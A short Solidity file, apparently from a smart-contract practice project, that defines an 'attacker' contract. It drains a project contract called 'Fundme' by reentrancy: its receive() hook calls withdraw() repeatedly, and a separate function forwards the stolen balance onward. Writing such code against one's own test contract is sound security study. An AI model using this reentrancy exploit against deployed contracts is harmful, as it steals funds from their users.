//SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;
import {Fundme} from "../src/Fundme.sol";
import {console} from "forge-std/console.sol";

contract attacker {

    Fundme fund;

    function withdraw(address fundmeAddress) public{
        fund = Fundme(fundmeAddress);
        console.log("Contract Balance: " , address(this).balance);
        fund.fund{value:1 ether}();
        fund.withdraw();
    }

    receive() external payable{
        if(address(fund)!=address(0) && address(fund).balance > 0){
            fund.withdraw();
        }
    }

    function withdrawFromContract(address attackeraddr) public {
        (bool success,)=attackeraddr.call{value: address(this).balance}("");
        if(!success){
            revert("Transaction Failed");
        }
    }
}